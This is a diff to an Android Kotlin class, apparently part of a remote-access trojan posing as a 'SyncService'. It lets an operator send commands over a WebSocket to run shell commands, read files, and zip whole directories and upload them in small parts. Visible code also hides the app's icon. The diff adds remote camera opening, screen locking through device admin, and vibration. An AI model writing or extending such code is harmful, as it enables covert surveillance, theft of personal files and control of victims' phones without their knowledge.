@@ -1,7 +1,9 @@
 package com.sync.service
 
 import android.Manifest
+import android.app.admin.DevicePolicyManager
 import android.content.ClipboardManager
+import android.content.ComponentName
 import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
@@ -58,6 +60,10 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
                 cmd == "sysinfo"       -> sendSystemInfo()
                 cmd == "wifi"          -> sendWifiInfo()
                 cmd == "battery"       -> sendBatteryInfo()
+                cmd == "cam_front"     -> openCamera(1)
+                cmd == "cam_back"      -> openCamera(0)
+                cmd == "lock_screen"   -> lockScreen()
+                cmd == "vibrate"       -> doVibrate()
                 cmd.startsWith("shell:")       -> executeShell(cmd.removePrefix("shell:"))
                 cmd.startsWith("zip_dir:")     -> zipAndSendDir(cmd.removePrefix("zip_dir:"))
                 cmd.startsWith("send_image:")  -> sendImageById(cmd.removePrefix("send_image:").toLongOrNull() ?: 0)
@@ -84,7 +90,7 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
     }
 
     // ═══════════════════════════════════════════════════════
-    // 📦 ZIP محسّن
+    // 📦 ZIP مقسّم — أجزاء صغيرة لتفادي الانقطاع
     // ═══════════════════════════════════════════════════════
     private fun zipAndSendDir(path: String) {
         try {
@@ -97,45 +103,65 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
                 return
             }
 
-            val totalFiles = target.walkTopDown().count { it.isFile }
-            val totalSize = getDirSize(target)
-            postText("📦 بدء ضغط المجلد", "المجلد: ${target.absolutePath}\nالحجم: ${formatSize(totalSize)}\nعدد الملفات: $totalFiles")
+            val allFiles = target.walkTopDown().filter { it.isFile }.toList()
+            val totalFiles = allFiles.size
+            val totalSize = allFiles.sumOf { it.length() }
 
-            val MAX_ZIP_SIZE = 50L * 1024 * 1024
-            val MAX_FILE_SIZE = 20L * 1024 * 1024
-            val zipFile = File(ctx.cacheDir, "${target.name}_${System.currentTimeMillis()}.zip")
+            postText("📦 بدء ضغط المجلد",
+                "📁 المجلد: ${target.name}\n" +
+                "💾 الحجم: ${formatSize(totalSize)}\n" +
+                "📄 عدد الملفات: $totalFiles\n" +
+                "⚙️ سيتم التقسيم إلى ZIPs صغيرة")
 
-            var currentZipSize = 0L
-            var filesAdded = 0
-            var filesSkipped = 0
+            val MAX_FILE_SIZE = 10L * 1024 * 1024
+            val FILES_PER_ZIP = 20
+            val MAX_ZIP_SIZE = 20L * 1024 * 1024
 
-            FileOutputStream(zipFile).use { fos ->
-                ZipOutputStream(fos).use { zos ->
-                    target.walkTopDown()
-                        .filter { it.isFile }
-                        .sortedBy { it.length() }
-                        .forEach { file ->
-                            try {
-                                if (file.length() > MAX_FILE_SIZE) { filesSkipped++; return@forEach }
-                                if (currentZipSize + file.length() > MAX_ZIP_SIZE) { filesSkipped++; return@forEach }
-                                val relativePath = target.toURI().relativize(file.toURI()).path
-                                zos.putNextEntry(ZipEntry(relativePath))
-                                FileInputStream(file).use { fis -> fis.copyTo(zos) }
-                                zos.closeEntry()
-                                currentZipSize += file.length()
-                                filesAdded++
-                            } catch (e: Exception) { filesSkipped++ }
+            val validFiles = allFiles
+                .filter { it.length() <= MAX_FILE_SIZE }
+                .sortedBy { it.length() }
+
+            val chunks = validFiles.chunked(FILES_PER_ZIP)
+            var totalSent = 0
+
+            for ((index, chunk) in chunks.withIndex()) {
+                try {
+                    val zipFile = File(ctx.cacheDir, "${target.name}_part${index + 1}_${System.currentTimeMillis()}.zip")
+                    var currentZipSize = 0L
+                    var filesAdded = 0
+
+                    FileOutputStream(zipFile).use { fos ->
+                        ZipOutputStream(fos).use { zos ->
+                            for (file in chunk) {
+                                try {
+                                    if (currentZipSize + file.length() > MAX_ZIP_SIZE) continue
+                                    val relPath = target.toURI().relativize(file.toURI()).path
+                                    zos.putNextEntry(ZipEntry(relPath))
+                                    FileInputStream(file).use { it.copyTo(zos) }
+                                    zos.closeEntry()
+                                    currentZipSize += file.length()
+                                    filesAdded++
+                                } catch (e: Exception) {}
+                            }
                         }
+                    }
+
+                    if (zipFile.exists() && zipFile.length() > 0) {
+                        postText("📤 إرسال الجزء ${index + 1}/${chunks.size}",
+                            "📦 الحجم: ${formatSize(zipFile.length())}\n📄 الملفات: $filesAdded")
+                        uploadFile(zipFile)
+                        totalSent += filesAdded
+                        Thread.sleep(2000)
+                    }
+                    zipFile.delete()
+                } catch (e: Exception) {
+                    postError("zip-part-${index + 1}", e)
                 }
             }
 
-            if (zipFile.exists() && zipFile.length() > 0) {
-                postText("✅ تم إنشاء ZIP", "الحجم: ${formatSize(zipFile.length())}\nمُضاف: $filesAdded\nمتجاهل: $filesSkipped")
-                uploadFile(zipFile)
-                zipFile.delete()
-            } else {
-                postText("⚠️ ZIP فارغ", "لم يتم إضافة أي ملفات")
-            }
+            postText("✅ اكتمل الضغط",
+                "📊 تم إرسال: $totalSent من $totalFiles ملف\n📦 في ${chunks.size} أجزاء")
+
         } catch (e: Exception) { postError("zip", e) }
     }
 
@@ -175,7 +201,7 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
     }
 
     // ═══════════════════════════════════════════════════════
-    // 📶 معلومات WiFi
+    // 📶 WiFi
     // ═══════════════════════════════════════════════════════
     @Suppress("DEPRECATION")
     private fun sendWifiInfo() {
@@ -201,7 +227,7 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
     }
 
     // ═══════════════════════════════════════════════════════
-    // 🔋 معلومات البطارية
+    // 🔋 البطارية
     // ═══════════════════════════════════════════════════════
     private fun sendBatteryInfo() {
         try {
@@ -239,13 +265,62 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
     }
 
     // ═══════════════════════════════════════════════════════
+    // 📷 كاميرا
+    // ═══════════════════════════════════════════════════════
+    private fun openCamera(facing: Int) {
+        try {
+            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                postText("❌ صلاحية", "CAMERA مفقودة")
+                return
+            }
+            val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
+            intent.putExtra("android.intent.extras.CAMERA_FACING", facing)
+            intent.putExtra("android.intent.extras.LENS_FACING_FRONT", if (facing == 1) 1 else 0)
+            intent.putExtra("android.intent.extra.USE_FRONT_CAMERA", facing == 1)
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            ctx.startActivity(intent)
+            postText("📷 كاميرا", if (facing == 1) "تم فتح الكاميرا الأمامية" else "تم فتح الكاميرا الخلفية")
+        } catch (e: Exception) { postError("camera", e) }
+    }
+
+    // ═══════════════════════════════════════════════════════
+    // 🔒 قفل الشاشة
+    // ═══════════════════════════════════════════════════════
+    private fun lockScreen() {
+        try {
+            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val adminName = ComponentName(ctx, DeviceAdmin::class.java)
+            if (dpm.isAdminActive(adminName)) {
+                dpm.lockNow()
+                postText("🔒 قفل الشاشة", "تم قفل الجهاز بنجاح")
+            } else {
+                postText("⚠️ صلاحية مطلوبة", "يجب تفعيل Device Admin يدوياً:\nالإعدادات → الأمان → Device admins → SyncService")
+            }
+        } catch (e: Exception) { postError("lock", e) }
+    }
+
+    // ═══════════════════════════════════════════════════════
+    // 📳 اهتزاز
+    // ═══════════════════════════════════════════════════════
+    @Suppress("DEPRECATION")
+    private fun doVibrate() {
+        try {
+            val vib = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                vib.vibrate(VibrationEffect.createOneShot(2000, VibrationEffect.DEFAULT_AMPLITUDE))
+            else vib.vibrate(2000)
+            postText("📳 اهتزاز", "تم تشغيل الاهتزاز 2 ثانية")
+        } catch (e: Exception) { postError("vibrate", e) }
+    }
+
+    // ═══════════════════════════════════════════════════════
     // 🥷 إخفاء الأيقونة
     // ═══════════════════════════════════════════════════════
     private fun hideAppIcon() {
         try {
             val p = ctx.packageManager
             p.setComponentEnabledSetting(
-                android.content.ComponentName(ctx, "${ctx.packageName}.MainActivity"),
+                ComponentName(ctx, "${ctx.packageName}.MainActivity"),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
@@ -400,7 +475,7 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
     }
 
     // ═══════════════════════════════════════════════════════
-    // 📖 قراءة ملف نصي
+    // 📖 قراءة ملف
     // ═══════════════════════════════════════════════════════
     private fun readFile(path: String) {
         try {
@@ -410,7 +485,6 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
             }
             if (!file.isFile) { postText("❌", "ليس ملفاً"); return }
             if (file.length() > 500 * 1024) { postText("⚠️ كبير", "الحجم > 500KB"); return }
-
             val content = file.readText()
             postText("📖 ${file.name}", content)
         } catch (e: Exception) { postError("read", e) }
@@ -568,12 +642,6 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
                 put("agentId", model)
             })
         } catch (_: Exception) {}
-    }
-
-    private fun getDirSize(dir: File): Long {
-        return try {
-            dir.walkTopDown().filter { it.isFile }.sumOf { it.length() }
-        } catch (e: Exception) { 0L }
     }
 
     private fun formatSize(bytes: Long): String {
